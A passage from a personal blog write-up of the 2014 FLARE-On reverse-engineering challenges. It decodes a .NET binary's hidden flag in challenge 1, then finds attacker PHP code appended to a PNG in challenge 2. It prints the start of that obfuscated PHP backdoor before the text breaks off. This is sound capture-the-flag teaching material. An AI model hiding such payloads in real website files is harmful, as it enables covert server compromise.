<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en-us">
<head>
  <link href="http://gmpg.org/xfn/11" rel="profile">
  <meta http-equiv="content-type" content="text/html; charset=utf-8">

  
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="viewport" content="width=device-width,minimum-scale=1,maximum-scale=1">

  
  <link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
  <link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">

  
  <title>My Adventure with Fireeye FLARE Challenge</title>

  
  <link rel="stylesheet" href="http://parsiya.net/css/hugo-octopress.css">

  
  <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css">

  
  

  
  <link href="http://parsiya.net/favicon.png" rel="icon">

  
  
  
  
  

  

  <meta name="description" content="">
  <meta name="keywords" content="[Parsia Hakimian Parsia infosec information security]">

  <meta name="author" content="Parsia">

  
  <meta name="generator" content="Hugo 0.15" />

  
  

</head>
<body>


<header role="banner"><hgroup>
  
  <h1><a href="http://parsiya.net/">Parsia&#39;s Den</a></h1>
    <h2>Because no one wants to be the other guy from Wham!</h2>
</hgroup></header>


<nav role="navigation">


<ul class="main-navigation">
  
  
    
      <li><a href="http://parsiya.net/" title="Blog">Blog</a></li>
    
  
    
      <li><a href="https://www.google.com/search?q=andrew&#43;ridgeley" target="_blank" title="The other guy from Wham!">The other guy from Wham!</a></li>
    
  
    
      <li><a href="http://parsiya.net/archive/" target="_blank" title="Archive">Archive</a></li>
    
  
    
      <li><a href="http://parsiya.net/license/" target="_blank" title="License">License</a></li>
    
  
    
      <li><a href="https://www.github.com/parsiya/hugo-octopress" target="_blank" title="This theme on Github">This theme on Github</a></li>
    
  
</ul>


<ul class="subscription">
  <a href="http://parsiya.net/index.xml" target="_blank" type="application/rss+xml" title="RSS"><i class="fa fa-rss-square fa-lg"></i></a>

  
  

</ul>


<form action="https://www.google.com/search" method="get" target="_blank">
  <fieldset role="search">
  	<input class="search" type="text" name="q" results="0" placeholder="Search"/>
    <input type="hidden" name="q" value="site:http://parsiya.net/" />
  </fieldset>
</form>

</nav>



<div id="main">
  <div id="content">
    <div>
      <article class="hentry" role="article">
        <header>
          <h1 class="entry-title">
            My Adventure with Fireeye FLARE Challenge 
          </h1>
          <p class="meta">Sep 23, 2014 - 78 minute read -  <a href="http://parsiya.net/blog/2014-09-23-my-adventure-with-fireeye-flare-challenge/#disqus_thread">Comments</a>

          

          
          
          <a class="label" href="http://parsiya.net/categories/reverse-engineering">Reverse Engineering</a>
          </p>
        </header>
        <div class="entry-content">
          

<p>These are my (rather long) solutions to Fireeye&rsquo;s FLARE challenge. This is just not the solution but other ways that I tried. This was a great learning experience for me so I am writing this post to document everything I tried. As a result, this post is somewhat long.</p>

<p>If you have any feedback, please let me know. I spent a lot of time on this writeup and I am always happy to learn new stuff. My email and twitter handle are in the sidebar.</p>

<p>I am a bit late to the party. There <del>were two</del> are now other three solutions posted (that I know of). Check them out.</p>

<ul>
<li><a href="https://www.codeandsec.com/Detailed-Solutions-to-FireEye-FLARE-Challenge" target="_blank">Detailed Solutions to FireEye FLARE Challenge</a></li>
<li><a href="http://www.ghettoforensics.com/2014/09/a-walkthrough-for-flare-re-challenges.html" target="_blank">A Walk through for FLARE RE Challenges</a></li>
<li>The FLARE On Challenge Solutions by Fireye

<ul>
<li><a href="http://www.fireeye.com/blog/technical/cyber-exploits/2014/11/the-flare-on-challenge-solutions-part-1-of-2.html" target="_blank">Part 1 - solutions for challenges 1 to 5</a></li>
<li><a href="https://www.fireeye.com/blog/threat-research/2014/11/flare_on_challengep.html" target="_blank">Part 2 - solutions for challenges 6 and 7</a></li>
</ul></li>
</ul>

<h3 id="links-to-individual-challenges:94bf06dd1bee42f6b34a1ff79274f7e7">Links to Individual Challenges</h3>

<p>This post is quite long (I didn&rsquo;t want to strip them into different posts), use the following links to jump to any specific challenge:</p>

<ul>
<li><a href="#ch1">Challenge 1</a></li>
<li><a href="#ch2">Challenge 2</a></li>
<li><a href="#ch3">Challenge 3</a></li>
<li><a href="#ch4">Challenge 4</a></li>
<li><a href="#ch5">Challenge 5</a></li>
<li><a href="#ch6">Challenge 6</a></li>
<li><a href="#ch7">Challenge 7</a></li>
</ul>

<h3 id="my-setup:94bf06dd1bee42f6b34a1ff79274f7e7">My Setup</h3>

<p>I used a Windows XP SP3 Virtual Machine for most challenges using VirtualBox. For challenge 6 I used a Kali 64-bit VM. I used IDA/Immunity on my host OS with some other utilities.</p>

<h3 id="helpful-tools:94bf06dd1bee42f6b34a1ff79274f7e7">Helpful Tools</h3>

<ul>
<li><a href="http://www.7-zip.org/download.html" target="_blank">7-zip</a></li>
<li><a href="http://www.winitor.com/" target="_blank">PE-Studio</a>: Gain information about the binary <strong>without running it.</strong> It also sends a hash (MD5 I think) of the file to Virustotal so if you want to keep your samples secret, don&rsquo;t give it internet access</li>
<li><a href="http://www.jetbrains.com/decompiler/" target="_blank">dotPeek</a>: Free .NET decompiler by JetBrains</li>
<li><a href="http://www.red-gate.com/products/dotnet-development/reflector/" target="_blank">.NET Reflector</a>: .NET decompiler. Not free but comes with a 2-week trial period</li>
<li><a href="http://mh-nexus.de/en/downloads.php?product=HxD" target="_blank">HxD</a>: Free Windows hex editor</li>
<li><a href="http://notepad-plus-plus.org/" target="_blank">Notepad++</a>: Slick FOSS text-editor</li>
<li><a href="http://debugger.immunityinc.com/ID_register.py" target="_blank">Immunity Debugger</a>: Windows debugger. Very similar to <a href="http://www.ollydbg.de/" target="_blank">OllyDbg</a></li>
<li><a href="https://code.google.com/p/pyew/" target="_blank">pyew</a>: A Python tool for static malware analysis. I used it for PDF analysis</li>
<li><a href="https://www.hex-rays.com/products/ida/" target="_blank">IDA</a>: What can I say? It&rsquo;s great but also costs an arm and a leg. Except challenge 6, the trial and free version are enough for us</li>
<li><a href="http://home.gna.org/bless/" target="_blank">Bless</a>: Linux Hex editor</li>
<li><a href="http://www.rohitab.com/apimonitor" target="_blank">API Monitor</a>: Free utility to monitor API calls in Windows. It can monitor calls for standard windows APIs or we can add application-specific Dlls and monitor them</li>
<li><a href="https://www.wireshark.org/download.html" target="_blank">Wireshark</a>: FOSS network monitoring/capturing tool. Needs administrator access on Windows to install libpcap</li>
<li><a href="http://www.microsoft.com/en-us/download/details.aspx?id=4865" target="_blank">Microsoft Network Monitor</a>: Microsoft network monitoring/capturing tool. Does not need administrator access. Replaced by <a href="http://www.microsoft.com/en-us/download/details.aspx?id=40308" target="_blank">Microsoft Message Analyzer</a></li>
</ul>

<hr />

<h2 id="a-name-ch1-a-challenge-1-bob-roge:94bf06dd1bee42f6b34a1ff79274f7e7"><a name="ch1"></a> Challenge 1 - Bob Roge</h2>

<p>The challenge starts with going to their website at <a href="http://flare-on.com" target="_blank">http://flare-on.com</a> and downloading a binary. The binary is a self-extracting zip file which is supposed to show you the challenge EULA. It didn&rsquo;t work on my VM.</p>

<p><img src="/images/2014/flare/1-1.jpg" alt="Self-Extracting zip failed :(" title="Self-Extracting zip failed :(" /></p>

<p>I opened it with <code>7-zip</code> to get <code>Challenge1.exe</code>. By dropping it into <code>PE-Studio</code> I gained more information:</p>
<div class="highlight" style="background: #002B36"><pre style="line-height: 125%">The Image is a fake Microsoft executable    # Company name is Microsoft but it is not signed?
The Manifest Identity name (MyApplication.app) is different than the Image name
The Version Information &#39;OriginalFilename&#39; (rev_challenge_1.exe) is different than the Image name
The Debug Symbol File Name () is different than the Image name (challenge1)
The image is Managed (.NET)
</pre></div>

<p>So it appears to be a .Net binary. Let&rsquo;s run it.</p>

<p><img src="/images/2014/flare/1-2.jpg" alt="Challenge 1 executed" title="Challenge 1 executed" /></p>

<p>Hey I love this guy. Let&rsquo;s press <code>DECODE.</code></p>

<p><img src="/images/2014/flare/1-3.jpg" alt="Much decode" title="Much decode" /></p>

<p>Look at that garbled data. We can decompile it (remember it&rsquo;s a .Net binary). Using <code>dotPeek</code> we can see the code for <code>Decode</code> button:</p>




    

<figure class="code">
  <figcaption>
  	<span>btnDecode_click</span>
  </figcaption>
  <div class="codewrapper"> 
    <table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%"> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26</pre></div></td><td class="code"><div class="highlight" style="background: #002B36"><pre style="line-height: 125%"><span style="color: #719e07">private</span> <span style="color: #719e07">void</span> <span style="color: #268BD2">btnDecode_Click</span><span style="color: #93A1A1">(</span><span style="color: #DC322F">object</span> <span style="color: #93A1A1">sender,</span> <span style="color: #93A1A1">EventArgs</span> <span style="color: #93A1A1">e)</span>
<span style="color: #93A1A1">{</span>
  <span style="color: #719e07">this</span><span style="color: #93A1A1">.pbRoge.Image</span> <span style="color: #93A1A1">=</span> <span style="color: #93A1A1">(Image)</span> <span style="color: #93A1A1">Resources.bob_roge;</span> <span style="color: #586E75">// change the image</span>
  <span style="color: #DC322F">byte</span><span style="color: #93A1A1">[]</span> <span style="color: #93A1A1">datSecret</span> <span style="color: #93A1A1">=</span> <span style="color: #93A1A1">Resources.dat_secret;</span>        <span style="color: #586E75">// interesting</span>
  <span style="color: #DC322F">string</span> <span style="color: #93A1A1">str1</span> <span style="color: #93A1A1">=</span> <span style="color: #2AA198">&quot;&quot;</span><span style="color: #93A1A1">;</span>
  <span style="color: #719e07">for</span> <span style="color: #93A1A1">(</span><span style="color: #DC322F">int</span> <span style="color: #93A1A1">index</span> <span style="color: #93A1A1">=</span> <span style="color: #2AA198">0</span><span style="color: #93A1A1">;</span> <span style="color: #93A1A1">index</span> <span style="color: #93A1A1">&lt;</span> <span style="color: #93A1A1">datSecret.Length;</span> <span style="color: #93A1A1">++index)</span>
  <span style="color: #93A1A1">{</span>
	<span style="color: #DC322F">byte</span> <span style="color: #93A1A1">num</span> <span style="color: #93A1A1">=</span> <span style="color: #93A1A1">datSecret[index];</span>
	<span style="color: #93A1A1">str1</span> <span style="color: #93A1A1">=</span> <span style="color: #93A1A1">str1</span> <span style="color: #93A1A1">+</span> <span style="color: #93A1A1">(</span><span style="color: #DC322F">object</span><span style="color: #93A1A1">)</span> <span style="color: #93A1A1">(</span><span style="color: #DC322F">char</span><span style="color: #93A1A1">)</span> <span style="color: #93A1A1">(((</span><span style="color: #DC322F">int</span><span style="color: #93A1A1">)</span> <span style="color: #93A1A1">num</span> <span style="color: #93A1A1">&gt;&gt;</span> <span style="color: #2AA198">4</span> <span style="color: #93A1A1">|</span> <span style="color: #93A1A1">(</span><span style="color: #DC322F">int</span><span style="color: #93A1A1">)</span> <span style="color: #93A1A1">num</span> <span style="color: #93A1A1">&lt;&lt;</span> <span style="color: #2AA198">4</span> <span style="color: #93A1A1">&amp;</span> <span style="color: #2AA198">240</span><span style="color: #93A1A1">)</span> <span style="color: #93A1A1">^</span> <span style="color: #2AA198">41</span><span style="color: #93A1A1">);</span>
  <span style="color: #93A1A1">}</span>
  <span style="color: #DC322F">string</span> <span style="color: #93A1A1">str2</span> <span style="color: #93A1A1">=</span> <span style="color: #93A1A1">str1</span> <span style="color: #93A1A1">+</span> <span style="color: #2AA198">&quot;\0&quot;</span><span style="color: #93A1A1">;</span>
  <span style="color: #DC322F">string</span> <span style="color: #93A1A1">str3</span> <span style="color: #93A1A1">=</span> <span style="color: #2AA198">&quot;&quot;</span><span style="color: #93A1A1">;</span>
  <span style="color: #DC322F">int</span> <span style="color: #93A1A1">index1</span> <span style="color: #93A1A1">=</span> <span style="color: #2AA198">0</span><span style="color: #93A1A1">;</span>
  <span style="color: #719e07">while</span> <span style="color: #93A1A1">(index1</span> <span style="color: #93A1A1">&lt;</span> <span style="color: #93A1A1">str2.Length)</span>
  <span style="color: #93A1A1">{</span>
	<span style="color: #93A1A1">str3</span> <span style="color: #93A1A1">=</span> <span style="color: #93A1A1">str3</span> <span style="color: #93A1A1">+</span> <span style="color: #93A1A1">(</span><span style="color: #DC322F">object</span><span style="color: #93A1A1">)</span> <span style="color: #93A1A1">str2[index1</span> <span style="color: #93A1A1">+</span> <span style="color: #2AA198">1</span><span style="color: #93A1A1">]</span> <span style="color: #93A1A1">+</span> <span style="color: #93A1A1">(</span><span style="color: #DC322F">object</span><span style="color: #93A1A1">)</span> <span style="color: #93A1A1">str2[index1];</span>
	<span style="color: #93A1A1">index1</span> <span style="color: #93A1A1">+=</span> <span style="color: #2AA198">2</span><span style="color: #93A1A1">;</span>
  <span style="color: #93A1A1">}</span>
  <span style="color: #DC322F">string</span> <span style="color: #93A1A1">str4</span> <span style="color: #93A1A1">=</span> <span style="color: #2AA198">&quot;&quot;</span><span style="color: #93A1A1">;</span>
  <span style="color: #719e07">for</span> <span style="color: #93A1A1">(</span><span style="color: #DC322F">int</span> <span style="color: #93A1A1">index2</span> <span style="color: #93A1A1">=</span> <span style="color: #2AA198">0</span><span style="color: #93A1A1">;</span> <span style="color: #93A1A1">index2</span> <span style="color: #93A1A1">&lt;</span> <span style="color: #93A1A1">str3.Length;</span> <span style="color: #93A1A1">++index2)</span>
  <span style="color: #93A1A1">{</span>
	<span style="color: #DC322F">int</span> <span style="color: #93A1A1">num</span> <span style="color: #93A1A1">=</span> <span style="color: #93A1A1">(</span><span style="color: #DC322F">int</span><span style="color: #93A1A1">)</span> <span style="color: #93A1A1">str3[index2];</span>
	<span style="color: #93A1A1">str4</span> <span style="color: #93A1A1">=</span> <span style="color: #93A1A1">str4</span> <span style="color: #93A1A1">+</span> <span style="color: #93A1A1">(</span><span style="color: #DC322F">object</span><span style="color: #93A1A1">)</span> <span style="color: #93A1A1">(</span><span style="color: #DC322F">char</span><span style="color: #93A1A1">)</span> <span style="color: #93A1A1">((</span><span style="color: #DC322F">uint</span><span style="color: #93A1A1">)</span> <span style="color: #93A1A1">(</span><span style="color: #DC322F">byte</span><span style="color: #93A1A1">)</span> <span style="color: #93A1A1">str3[index2]</span> <span style="color: #93A1A1">^</span> <span style="color: #2AA198">102</span><span style="color: #93A1A1">U);</span>
  <span style="color: #93A1A1">}</span>
  <span style="color: #719e07">this</span><span style="color: #93A1A1">.lbl_title.Text</span> <span style="color: #93A1A1">=</span> <span style="color: #93A1A1">str4;</span>
<span style="color: #93A1A1">}</span>
</pre></div>
</td></tr></table>
  </div>
</figure>


<p>Line 4 reads <code>dat_secret</code> and the rest of the function manipulates it before displaying it on the form. To save this file expand <code>resources</code> and select <code>rev_challenge_1.dat_secret.encode</code>. Right click and select <code>Save Resource to File.</code></p>

<p><img src="/images/2014/flare/1-4.jpg" alt="Saving private secret" title="Saving private secret" /></p>

<p>I used <code>HxD</code> to look at the contents.</p>




    

<figure class="code">
  <figcaption>
  	<span>Contents of dat_secret</span>
  </figcaption>
  <div class="codewrapper"> 
    <table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%">1
2</pre></div></td><td class="code"><div class="highlight" style="background: #002B36"><pre style="line-height: 125%">A1 B5 <span style="color: #2AA198">44</span> <span style="color: #2AA198">84</span> <span style="color: #2AA198">14</span> E4 A1 B5 D4 <span style="color: #2AA198">70</span> B4 <span style="color: #2AA198">91</span> B4 <span style="color: #2AA198">70</span> D4 <span style="color: #2AA198">91</span> E4 C4 <span style="color: #2AA198">96</span> F4 <span style="color: #2AA198">54</span> <span style="color: #2AA198">84</span> B5 C4 <span style="color: #2AA198">40</span> <span style="color: #2AA198">64</span> <span style="color: #2AA198">74</span> <span style="color: #2AA198">70</span> A4 <span style="color: #2AA198">64</span> 44
¡µD„.ä¡µÔp´‘´pÔ‘äÄ–ôT„µÄ@dtp¤dD
</pre></div>
</td></tr></table>
  </div>
</figure>


<p>Let&rsquo;s run the code with <code>dat_secret</code> and print the result after each level (i.e. <code>str2, str3 and str4</code>). One option is to use the provided C# code. I re-wrote the code in Python and ran it online using <a href="http://repl.it/languages" target="_blank">repl.it</a>. Str1 is the answer so we don&rsquo;t care about the rest:</p>




    

<figure class="code">
  <figcaption>
  	<span>Decoding dat_secret</span>
  </figcaption>
  <div class="codewrapper"> 
    <table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%"> 1
 2
 3
 4
 5
 6
 7
 8
 9
10</pre></div></td><td class="code"><div class="highlight" style="background: #002B36"><pre style="line-height: 125%"><span style="color: #719e07">from</span> <span style="color: #93A1A1">binascii</span> <span style="color: #719e07">import</span> <span style="color: #93A1A1">unhexlify</span>

<span style="color: #93A1A1">datsecret</span> <span style="color: #719e07">=</span> <span style="color: #93A1A1">unhexlify</span> <span style="color: #93A1A1">(</span><span style="color: #2AA198">&quot;A1B5448414E4A1B5D470B491B470D491E4C496F45484B5C440647470A46444&quot;</span><span style="color: #93A1A1">)</span>
<span style="color: #93A1A1">str1</span><span style="color: #719e07">=</span><span style="color: #2AA198">&quot;&quot;</span>

<span style="color: #719e07">for</span> <span style="color: #93A1A1">item</span> <span style="color: #719e07">in</span> <span style="color: #93A1A1">datsecret:</span>
    <span style="color: #93A1A1">num</span> <span style="color: #719e07">=</span> <span style="color: #B58900">ord</span><span style="color: #93A1A1">(item)</span>
    <span style="color: #93A1A1">str1</span> <span style="color: #719e07">+=</span>  <span style="color: #B58900">chr</span><span style="color: #93A1A1">(</span> <span style="color: #93A1A1">(</span> <span style="color: #93A1A1">num</span> <span style="color: #719e07">&gt;&gt;</span> <span style="color: #2AA198">4</span> <span style="color: #719e07">|</span> <span style="color: #93A1A1">num</span> <span style="color: #719e07">&lt;&lt;</span> <span style="color: #2AA198">4</span> <span style="color: #719e07">&amp;</span> <span style="color: #2AA198">240</span><span style="color: #93A1A1">)</span> <span style="color: #719e07">^</span> <span style="color: #2AA198">41</span> <span style="color: #93A1A1">)</span>

<span style="color: #719e07">print</span> <span style="color: #93A1A1">str1</span>
</pre></div>
</td></tr></table>
  </div>
</figure>


<h4 id="level-1-flag-3rmahg3rd-b0b-d0ge-flare-on-com:94bf06dd1bee42f6b34a1ff79274f7e7">Level 1 flag: 3rmahg3rd.b0b.d0ge@flare-on.com</h4>

<hr />

<h2 id="a-name-ch2-a-challenge-2-a-study-in-javascript:94bf06dd1bee42f6b34a1ff79274f7e7"><a name="ch2"></a> Challenge 2 - A Study in JavaScript</h2>
<div class="highlight" style="background: #002B36"><pre style="line-height: 125%">Well done! Looks like you kicked that one. I&#39;ve attached the next challenge for your reversing pleasure. The password to this zip archive is &quot;malware&quot;.
We saw what looked like attacker activity to this site, can you figure out what the attackers changed?
Hopefully you&#39;ll knock this one out too, Good luck!

-FLARE
</pre></div>

<p>Inside the archive seems to be a copy of the original <a href="http://flare-on.com" target="_blank">http://flare-on.com</a> with a launch date countdown timer. I will be calling the html page from the website <code>original_html</code> and the one in the zip file <code>challenge_html</code>.</p>




    

<figure class="code">
  <figcaption>
  	<span>Contents of challenge zip file</span>
  </figcaption>
  <div class="codewrapper"> 
    <table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%">1
2
3
4</pre></div></td><td class="code"><div class="highlight" style="background: #002B36"><pre style="line-height: 125%"><span style="color: #93A1A1">-rwx------+</span> <span style="color: #93A1A1">1</span> <span style="color: #93A1A1">TyRaX</span> <span style="color: #93A1A1">None</span> <span style="color: #93A1A1">8378</span> <span style="color: #93A1A1">home.html</span>

<span style="color: #93A1A1">directory</span> <span style="color: #93A1A1">called</span> <span style="color: #2AA198">&quot;img&quot;</span> <span style="color: #93A1A1">with</span> <span style="color: #93A1A1">one</span> <span style="color: #93A1A1">single</span> <span style="color: #93A1A1">png</span>
<span style="color: #93A1A1">-rwx------+</span> <span style="color: #93A1A1">1</span> <span style="color: #93A1A1">TyRaX</span> <span style="color: #93A1A1">None</span> <span style="color: #93A1A1">9560</span> <span style="color: #93A1A1">flare-on.png</span>
</pre></div>
</td></tr></table>
  </div>
</figure>


<p><img src="/images/2014/flare/2-1.jpg" alt="challenge_html" title="challenge_html" /></p>

<p>The original web page looks a bit different.



    

<figure class="code">
  <figcaption>
  	<span>Original web page</span>
  </figcaption>
  <div class="codewrapper"> 
    <table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%">1
2
3
4
5</pre></div></td><td class="code"><div class="highlight" style="background: #002B36"><pre style="line-height: 125%"><span style="color: #93A1A1">-rwx------+</span> <span style="color: #93A1A1">1</span> <span style="color: #93A1A1">TyRaX</span> <span style="color: #93A1A1">None</span> <span style="color: #93A1A1">6254</span> <span style="color: #93A1A1">The</span> <span style="color: #93A1A1">FLARE</span> <span style="color: #93A1A1">On</span> <span style="color: #93A1A1">Challenge.htm</span>

<span style="color: #93A1A1">and</span>
<span style="color: #93A1A1">-rwx------+</span> <span style="color: #93A1A1">1</span> <span style="color: #93A1A1">TyRaX</span> <span style="color: #93A1A1">None</span> <span style="color: #93A1A1">116290</span> <span style="color: #93A1A1">bootstrap.css</span>
<span style="color: #93A1A1">-rwx------+</span> <span style="color: #93A1A1">1</span> <span style="color: #93A1A1">TyRaX</span> <span style="color: #93A1A1">None</span>   <span style="color: #93A1A1">6596</span> <span style="color: #93A1A1">flare-on-V2.png</span>
</pre></div>
</td></tr></table>
  </div>
</figure>
</p>

<p><img src="/images/2014/flare/2-2.jpg" alt="original_html" title="original_html" /></p>

<p>The timer threw me off track. Is it really a countdown timer? When does it reach zero?<br />
I changed the time in my VM to mess with it but it synced up with host.</p>




    

<figure class="code">
  <figcaption>
  	<span>To de-sync guest and host time/date</span>
  </figcaption>
  <div class="codewrapper"> 
    <table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%">1
2
3</pre></div></td><td class="code"><div class="highlight" style="background: #002B36"><pre style="line-height: 125%"><span style="color: #586E75"># vboxmanage is in the VirtualBox installation directory</span>
<span style="color: #586E75"># So on Windows: C:\Program Files\Oracle\VirtualBox</span>
<span style="color: #93A1A1">vboxmanage</span> <span style="color: #93A1A1">setextradata</span> <span style="color: #CB4B16">[VMname]</span> <span style="color: #2AA198">&quot;VBoxInternal/Devices/VMMDev/0/Config/GetHostTimeDisabled&quot;</span> <span style="color: #2AA198">&quot;1&quot;</span>
</pre></div>
</td></tr></table>
  </div>
</figure>


<p>Changing the time did not mess with anything.</p>

<p>We can diff the htmls or use Notepad++&rsquo;s <a href="http://www.davidtan.org/how-to-compare-two-text-files-using-notepad-plus/" target="_blank">compare</a> plugin.
Most differences are aesthetic. There are two interesting differences. In line 54, <code>original_html</code> has <code>&lt;img src=&quot;The%20FLARE%20On%20Challenge_files/flare-on-V2.png&quot;&gt;</code> while <code>challenge_html</code> includes <code>&lt;img src=&quot;img/flare-on.png&quot;&gt;</code>. So the file in the website is version 2 of the image. Later in the <code>challenge_html</code> we see more evidence of this image file <code>&lt;?php include &quot;img/flare-on-V3.png&quot; ?&gt;</code>. But wait a minute, the filesize of these images were different:</p>




    

<figure class="code">
  <figcaption>
  	<span>Different sizes</span>
  </figcaption>
  <div class="codewrapper"> 
    <table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%">1
2</pre></div></td><td class="code"><div class="highlight" style="background: #002B36"><pre style="line-height: 125%"><span style="color: #93A1A1">-rwx------+</span> <span style="color: #93A1A1">1</span> <span style="color: #93A1A1">TyRaX</span> <span style="color: #93A1A1">None</span> <span style="color: #93A1A1">9560</span> <span style="color: #93A1A1">Jul</span>  <span style="color: #93A1A1">7</span> <span style="color: #93A1A1">21:30</span> <span style="color: #93A1A1">flare-on.png</span>
<span style="color: #93A1A1">-rwx------+</span> <span style="color: #93A1A1">1</span> <span style="color: #93A1A1">TyRaX</span> <span style="color: #93A1A1">None</span> <span style="color: #93A1A1">6596</span> <span style="color: #93A1A1">Dec</span> <span style="color: #93A1A1">18</span>  <span style="color: #93A1A1">2013</span> <span style="color: #93A1A1">flare-on-V2.png</span>
</pre></div>
</td></tr></table>
  </div>
</figure>


<p>The challenge png is bigger. I used <code>HxD</code> to compare these two files (as they are not text) and at the end of <code>flare-on.png</code> I saw some PHP code. To be honest I was thinking of steganography or some <a href="https://twitter.com/angealbertini" target="_blank">Ange Albertini magic</a>. But that would have been too hard for level 2. Here is the PHP code (beautified):</p>




    

<figure class="code">
  <figcaption>
  	<span>Code inside png</span>
  </figcaption>
  <div class="codewrapper"> 
    <table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%"> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13</pre></div></td><td class="code"><div class="highlight" style="background: #002B36"><pre style="line-height: 125%"><span style="color: #719e07">&lt;?php</span> 
<span style="color: #268BD2">$terms</span><span style="color: #719e07">=array</span><span style="color: #93A1A1">(</span><span style="color: #2AA198">&quot;M&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;Z&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;]&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;p&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;</span><span style="color: #CB4B16">\\</span><span style="color: #2AA198">&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;w&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;f&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;1&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;v&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;&lt;&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;a&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;Q&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;z&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot; &quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;s&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;m&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;+&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;E&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;D&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;g&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;W&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;</span><span style="color: #CB4B16">\&quot;</span><span style="color: #2AA198">&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;q&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;y&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;T&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;V&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;n&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;S&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;X&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;)&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;9&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;C&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;P&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;r&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;&amp;&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;\&#39;&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;!&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;x&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;G&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;:&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;2&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;~&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;O&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;h&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;u&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;U&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;@&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;;&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;H&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;3&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;F&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;6&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;b&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;L&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;&gt;&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;^&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;,&quot;</span><span style="color: #93A1A1">,</span> <span style="color: 